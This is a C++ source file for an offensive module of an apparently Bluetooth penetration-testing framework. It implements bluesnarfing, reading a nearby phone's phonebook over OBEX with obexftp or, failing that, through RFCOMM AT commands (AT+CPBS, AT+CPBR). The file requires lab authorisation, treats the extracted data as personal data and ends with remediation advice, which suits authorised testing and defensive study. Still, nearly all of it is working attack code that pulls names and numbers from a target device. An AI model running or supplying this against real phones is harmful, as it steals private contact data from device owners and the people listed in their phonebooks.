#include "core/bt.h"
#include "core/config.h"
#include "core/module.h"

#include <filesystem>
#include <fstream>
#include <sstream>
#include <unistd.h>

namespace {
using namespace blueboy;

/// Bluesnarfing: pull the phonebook object through OBEX (obexftp) or, when the
/// device only exposes an AT prompt, through RFCOMM. The extracted file stays
/// in the report directory so the operator decides what to keep.
class Bluesnarf : public Module {
public:
  std::string name() const override { return "bluesnarf"; }
  std::string category() const override { return "offensive"; }
  std::string description() const override {
    return "Phonebook extraction over OBEX, with RFCOMM AT fallback";
  }
  std::string cve() const override { return "CVE-2003-0618 (historic class)"; }
  std::string requirements() const override {
    return "obexftp or exposed AT channel, lab authorisation";
  }
  bool offensive() const override { return true; }
  std::string impact() const override {
    return "Reads the peer's phonebook object (names, numbers). Extracted data "
           "is written to the report directory and must be handled as PII.";
  }

  ModuleResult run(const ModuleContext &ctx) override {
    ModuleResult r;

    if (bt::tool_exists("obexftp")) {
      const std::string obj =
          ctx.config->get("bluesnarf", "object", "telecom/pb.vcf");
      const std::string local = "bluesnarf_" + ctx.target + ".vcf";

      std::error_code ec;
      std::filesystem::create_directories(ctx.output_dir, ec);
      std::filesystem::remove(std::filesystem::path(ctx.output_dir) / local, ec);

      bt::ToolResult tr =
          bt::run_tool({"obexftp", "-b", ctx.target, "-c", "telecom", "-g",
                        std::filesystem::path(obj).filename().string()},
                       ctx.config->get_int("bluesnarf", "timeout_ms", 20000),
                       ctx.output_dir);

      r.add("obexftp exit code " + std::to_string(tr.exit_code));
      const auto path = std::filesystem::path(ctx.output_dir) / local;
      const auto produced = std::filesystem::path(ctx.output_dir) /
                            std::filesystem::path(obj).filename();

      const std::filesystem::path *found = nullptr;
      if (std::filesystem::exists(produced, ec) && !ec)
        found = &produced;
      else if (std::filesystem::exists(path, ec) && !ec)
        found = &path;

      if (found) {
        std::ifstream in(*found);
        std::ostringstream head;
        std::string line;
        int lines = 0;
        while (lines < 12 && std::getline(in, line)) {
          head << line << "\n";
          ++lines;
        }
        r.success = true;
        r.summary = "Phonebook object retrieved: " + found->string();
        r.add("Preview (first 12 lines):\n" + head.str());
        r.advise("Move the export out of the report directory and delete it at "
                 "the end of the engagement");
        return r;
      }
      r.add("OBEX returned no file: " + (tr.output.empty()
                                            ? std::string("(no output)")
                                            : tr.output.substr(0, 200)));
    } else {
      r.add("obexftp not installed; trying the RFCOMM AT fallback");
    }

    int channel = ctx.config->get_int("bluesnarf", "channel", 0);
    int sock = -1;
    if (!bt::rfcomm_connect(ctx.target, channel == 0 ? 1 : channel, 8000, sock)) {
      r.summary = "Could not reach an OBEX or AT endpoint on " + ctx.target;
      r.advise("Install obexftp ('pacman -S obexftp') for the OBEX path, or set "
               "[bluesnarf] channel to an exposed serial channel");
      return r;
    }

    bt::rfcomm_send(sock, "AT+CPBS=\"SM\"\r\n");
    bt::rfcomm_read(sock, 1500);
    bt::rfcomm_send(sock, "AT+CPBR=1,20\r\n");
    std::string book = bt::rfcomm_read(sock, 4000);
    ::close(sock);

    for (char &c : book) {
      if (c == '\r' || c == '\n')
        c = ' ';
    }
    if (book.size() > 400)
      book = book.substr(0, 400) + "...";

    r.success = !book.empty();
    r.summary = r.success ? "Phonebook read through the AT interpreter"
                          : "AT prompt did not return phonebook data";
    r.add("AT+CPBR=1,20 => " + (book.empty() ? std::string("(no answer)") : book));
    r.advise("Report the exposure even if the SIM is empty: the AT interpreter "
             "itself is the vulnerability");
    r.advise("Require authentication on all RFCOMM services and disable SPP");
    return r;
  }
};

REGISTER_MODULE(Bluesnarf);
} // namespace
